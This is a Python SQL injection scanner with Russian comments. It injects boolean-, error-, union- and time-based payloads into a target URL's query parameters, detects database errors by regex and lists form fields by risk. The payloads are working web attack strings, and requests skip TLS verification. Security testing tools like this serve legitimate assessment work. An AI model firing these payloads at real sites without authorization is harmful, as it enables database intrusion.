import requests
import re
from urllib.parse import urlparse, parse_qs, urlencode

class AdvancedSQLScanner:
    def __init__(self, target_url):
        self.target_url = target_url
        self.name = "Advanced SQL Injection Scanner"
        self.description = "Расширенная проверка на SQL инъекции"
        
        # Payload для различных типов SQL инъекций
        self.sql_payloads = {
            'boolean_based': [
                "' OR '1'='1",
                "' OR '1'='1' --",
                "' OR '1'='1' /*",
                "admin' OR '1'='1",
            ],
            'error_based': [
                "'",
                "\"",
                "' OR 1=CONVERT(int, @@version)--",
                "' AND 1=CONVERT(int, @@version)--",
            ],
            'union_based': [
                "' UNION SELECT NULL--",
                "' UNION SELECT NULL, NULL--",
                "' UNION SELECT @@version, NULL--",
            ],
            'time_based': [
                "' OR SLEEP(5)--",
                "' OR (SELECT * FROM (SELECT(SLEEP(5)))a)--",
            ]
        }
        
        # Паттерны SQL ошибок для разных СУБД
        self.error_patterns = {
            'mysql': [
                r"SQL syntax.*MySQL",
                r"Warning.*mysql_.*",
                r"MySQLSyntaxErrorException",
                r"valid MySQL result",
            ],
            'postgresql': [
                r"PostgreSQL.*ERROR",
                r"Warning.*\Wpg_.*",
                r"valid PostgreSQL result",
            ],
            'mssql': [
                r"Microsoft OLE DB Provider for ODBC Drivers",
                r"ODBC SQL Server Driver",
                r"SQLServer JDBC Driver",
            ],
            'oracle': [
                r"ORA-[0-9][0-9][0-9][0-9]",
                r"Oracle error",
                r"Oracle.*Driver",
            ]
        }
    
    def detect_db_from_errors(self, response_text):
        """Определение СУБД по ошибкам в ответе"""
        for db_type, patterns in self.error_patterns.items():
            for pattern in patterns:
                if re.search(pattern, response_text, re.IGNORECASE):
                    return db_type
        return None
    
    def test_sql_injection(self, test_url, payload):
        """Тестирование одного payload"""
        try:
            response = requests.get(
                test_url, 
                timeout=8, 
                verify=False,
                headers={
                    'User-Agent': 'SQL-Scanner/1.0',
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
                }
            )
            
            # Проверяем SQL ошибки
            detected_db = self.detect_db_from_errors(response.text)
            if detected_db:
                return True, f"SQL ошибка ({detected_db.upper()})"
            
            # Проверяем изменение в ответе (базовый метод)
            baseline_response = requests.get(self.target_url, timeout=5, verify=False)
            
            # Разные методы обнаружения
            length_diff = abs(len(response.text) - len(baseline_response.text))
            length_ratio = length_diff / len(baseline_response.text) if len(baseline_response.text) > 0 else 0
            
            # Ищем ключевые слова в ответе
            sql_keywords = ['mysql', 'sql', 'database', 'query', 'syntax']
            keyword_matches = sum(1 for keyword in sql_keywords if keyword in response.text.lower())
            
            # Эвристики для обнаружения SQLi
            if length_ratio > 0.3:  # Сильное изменение длины
                return True, f"Значительное изменение ответа ({length_ratio:.1%})"
            elif keyword_matches > 2:  # Много SQL-ключевых слов
                return True, f"Обнаружены SQL-ключевые слова ({keyword_matches})"
            elif "error" in response.text.lower() and "sql" in response.text.lower():
                return True, "Текст ошибки содержит SQL"
                
        except requests.exceptions.Timeout:
            # Timeout может указывать на time-based SQLi
            return True, "Таймаут запроса (возможна time-based SQLi)"
        except Exception as e:
            return False, f"Ошибка: {str(e)}"
        
        return False, None
    
    def analyze_url_for_sqli(self):
        """Анализ URL на SQL инъекции"""
        results = []
        
        parsed_url = urlparse(self.target_url)
        query_params = parse_qs(parsed_url.query)
        
        if not query_params:
            return results
        
        print(f"   🔍 Тестирование {len(query_params)} параметров на SQLi...")
        
        for param in query_params:
            original_value = query_params[param][0]
            
            # Тестируем разные типы payload
            for payload_type, payloads in self.sql_payloads.items():
                if payload_type in ['boolean_based', 'error_based']:  # Начинаем с простых
                    for payload in payloads[:2]:  # Первые 2 payload каждого типа
                        
                        # Создаем тестовый URL
                        test_params = query_params.copy()
                        test_params[param] = [payload]
                        
                        test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}"
                        if test_params:
                            test_url += "?" + urlencode(test_params, doseq=True)
                        
                        is_vulnerable, reason = self.test_sql_injection(test_url, payload)
                        
                        if is_vulnerable:
                            results.append({
                                'type': 'SQL_INJECTION',
                                'severity': 'critical',
                                'description': f'Потенциальная SQL инъекция ({payload_type}) в параметре {param}',
                                'details': f'Payload: {payload}, Причина: {reason}',
                                'payload_type': payload_type,
                                'parameter': param
                            })
                            break  # Переходим к следующему параметру
                    if any(r['parameter'] == param for r in results):
                        break  # Уязвимость уже найдена для этого параметра
        
        return results
    
    def scan_forms_for_sqli(self):
        """Поиск форм для потенциальных SQL инъекций"""
        forms_info = []
        
        try:
            response = requests.get(self.target_url, timeout=10, verify=False)
            html = response.text
            
            # Ищем формы
            form_pattern = r'<form[^>]*>.*?</form>'
            forms = re.findall(form_pattern, html, re.IGNORECASE | re.DOTALL)
            
            if not forms:
                return ["Формы не найдены в HTML"]
            
            for i, form in enumerate(forms, 1):
                # Извлекаем атрибуты формы
                action_match = re.search(r'action=["\']?([^"\'\s>]+)', form, re.IGNORECASE)
                method_match = re.search(r'method=["\']?([^"\'\s>]+)', form, re.IGNORECASE)
                
                action = action_match.group(1) if action_match else ''
                method = method_match.group(1).upper() if method_match else 'GET'
                
                # Ищем поля ввода
                inputs = re.findall(r'<input[^>]*>', form, re.IGNORECASE)
                textareas = re.findall(r'<textarea[^>]*>', form, re.IGNORECASE)
                
                # Анализируем поля
                field_analysis = []
                for inp in inputs:
                    name_match = re.search(r'name=["\']?([^"\'\s>]+)', inp, re.IGNORECASE)
                    type_match = re.search(r'type=["\']?([^"\'\s>]+)', inp, re.IGNORECASE)
                    
                    if name_match:
                        field_name = name_match.group(1)
                        field_type = type_match.group(1) if type_match else 'text'
                        
                        # Определяем потенциально опасные поля
                        risk = 'low'
                        if field_type in ['text', 'search', 'email', 'password']:
                            risk = 'medium'
                        if any(keyword in field_name.lower() for keyword in ['user', 'name', 'id', 'query', 'search']):
                            risk = 'high'
                        
                        field_analysis.append(f"{field_name} ({field_type}, риск: {risk})")
                
                forms_info.append(f"Форма {i}: {method} {action}")
                if field_analysis:
                    forms_info.extend([f"  - {field}" for field in field_analysis[:3]])  # Показываем первые 3
                
        except Exception as e:
            forms_info.append(f"Ошибка анализа форм: {str(e)}")
        
        return forms_info
    
    def scan(self):
        """Основной метод сканирования"""
        results = {
            'vulnerabilities': [],
            'warnings': [],
            'info': []
        }
        
        # Анализ URL параметров
        sqli_results = self.analyze_url_for_sqli()
        if sqli_results:
            results['vulnerabilities'].extend(sqli_results)
            results['info'].append(f"Потенциальные SQL инъекции: {len(sqli_results)}")
        else:
            results['info'].append("SQL инъекции в URL параметрах не обнаружены")
        
        # Анализ форм
        forms_info = self.scan_forms_for_sqli()
        results['info'].extend(forms_info)
        
        # Рекомендации
        if any('форма' in info.lower() for info in forms_info):
            results['info'].append("Рекомендации по тестированию SQLi:")
            results['info'].append("  1. Используйте SQLmap для автоматического тестирования")
            results['info'].append("  2. Протестируйте формы с параметризованными payload")
            results['info'].append("  3. Проверьте error-based, union-based и time-based инъекции")
        
        # Общая оценка риска
        if sqli_results:
            results['warnings'].append("Обнаружены признаки SQL инъекций. Необходима ручная проверка.")
        elif any('риск: high' in info for info in forms_info):
            results['warnings'].append("Высокорисковые поля найдены. Рекомендуется тестирование.")
        
        return results
